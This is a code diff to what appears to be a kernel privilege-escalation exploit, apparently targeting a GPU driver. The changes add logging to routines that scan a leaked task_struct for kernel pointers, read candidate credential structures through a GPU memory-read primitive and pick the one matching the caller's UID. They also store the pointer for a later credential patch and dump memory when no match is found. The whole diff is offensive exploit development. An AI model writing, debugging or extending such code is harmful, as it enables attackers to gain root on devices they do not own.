@@ -1208,20 +1208,39 @@ static void safe_cred_patch(void)
             
             // Search for cred_ptr in a 1.5KB window around comm
             fprintf(stderr, "[CHILD] Searching for cred_ptr (target UID %d)...\n", my_uid);
+            int candidates_count = 0;
             for (int off = comm_off - 1024; off < comm_off + 256; off += 8) {
                 if (off < 0 || off > 8192 - 8) continue;
                 uint64_t ptr = *(uint64_t *)(big_task_data + off);
                 if ((ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
+                    candidates_count++;
                     uint8_t cred_check[64];
                     if (gpu_read_task_struct(fd, ptr, cred_check, 64) == 0) {
                         uint32_t usage = *(uint32_t *)(cred_check + 0x00);
                         uint32_t uid = *(uint32_t *)(cred_check + 0x04);
-                        if (usage > 0 && usage < 2000 && uid == my_uid) {
+                        uint32_t gid = *(uint32_t *)(cred_check + 0x08);
+                        
+                        fprintf(stderr, "[CHILD]   Candidate at off 0x%x: ptr=0x%lx, usage=%u, uid=%u, gid=%u\n", 
+                                off, (unsigned long)ptr, usage, uid, gid);
+
+                        if (usage > 0 && usage < 10000 && uid == my_uid) {
                             cred_ptr = ptr;
-                            fprintf(stderr, "[CHILD] FOUND CRED! ptr=0x%lx at off 0x%x\n", (unsigned long)cred_ptr, off);
+                            fprintf(stderr, "[CHILD] [!!!] FOUND MATCHING CRED! ptr=0x%lx\n", (unsigned long)cred_ptr);
                             break;
                         }
+                    } else {
+                        fprintf(stderr, "[CHILD]   Candidate at off 0x%x: ptr=0x%lx (GPU read failed)\n", off, (unsigned long)ptr);
                     }
+                }
+            }
+            if (cred_ptr == 0) {
+                fprintf(stderr, "[CHILD] [!] No matching cred found. Total K-PTR candidates checked: %d\n", candidates_count);
+                // Dump 128 bytes around comm_off for manual analysis
+                fprintf(stderr, "[CHILD] DUMP around comm_off (0x%x):\n", comm_off);
+                for (int d = comm_off - 64; d < comm_off + 64; d += 16) {
+                    if (d < 0 || d > 8192 - 16) continue;
+                    fprintf(stderr, "  0x%04x: %016lx %016lx\n", d, 
+                            *(uint64_t*)(big_task_data + d), *(uint64_t*)(big_task_data + d + 8));
                 }
             }
         }
@@ -1887,15 +1906,28 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
                         if (c_off != -1) {
                             uint64_t c_ptr = 0, rc_ptr = 0;
                             uid_t my_uid = getuid();
+                            fprintf(stderr, "      [*] Parent searching for cred_ptr near c_off 0x%x (UID %d)...\n", c_off, my_uid);
+                            int p_cand = 0;
                             for (int off = c_off - 1024; off < c_off + 256; off += 8) {
                                 if (off < 0 || off > 8192 - 8) continue;
                                 uint64_t p = *(uint64_t *)(big_data + off);
                                 if ((p & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
+                                    p_cand++;
                                     uint8_t cc[64];
                                     if (gpu_read_task_struct(fd, p, cc, 64) == 0) {
-                                        if (*(uint32_t*)(cc+4) == my_uid && *(uint32_t*)cc < 2000) {
+                                        uint32_t usage = *(uint32_t *)cc;
+                                        uint32_t uid = *(uint32_t *)(cc + 4);
+                                        uint32_t gid = *(uint32_t *)(cc + 8);
+                                        
+                                        if (p_cand < 10) { // Limit parent log to first 10 candidates to avoid flooding
+                                            fprintf(stderr, "      [P] Candidate off 0x%x: ptr=0x%lx, uid=%u, usage=%u\n", 
+                                                    off, (unsigned long)p, uid, usage);
+                                        }
+
+                                        if (uid == my_uid && usage > 0 && usage < 10000) {
                                             c_ptr = p;
                                             rc_ptr = p;
+                                            fprintf(stderr, "      [P] [!!!] Parent found MATCHING CRED! ptr=0x%lx\n", (unsigned long)c_ptr);
                                             break;
                                         }
                                     }
@@ -1904,7 +1936,9 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
                             if (c_ptr) {
                                 *(uint64_t *)&gbuf[GBUF_CRED_PTR] = c_ptr;
                                 *(uint64_t *)&gbuf[GBUF_REAL_CRED_PTR] = rc_ptr;
-                                fprintf(stderr, "      [!!!] CRED FOUND by Parent: 0x%lx (saved to gbuf)\n", (unsigned long)c_ptr);
+                                fprintf(stderr, "      [!!!] Parent saved cred_ptr to gbuf\n");
+                            } else {
+                                fprintf(stderr, "      [P] Parent checked %d candidates, no match.\n", p_cand);
                             }
                         }
                     }
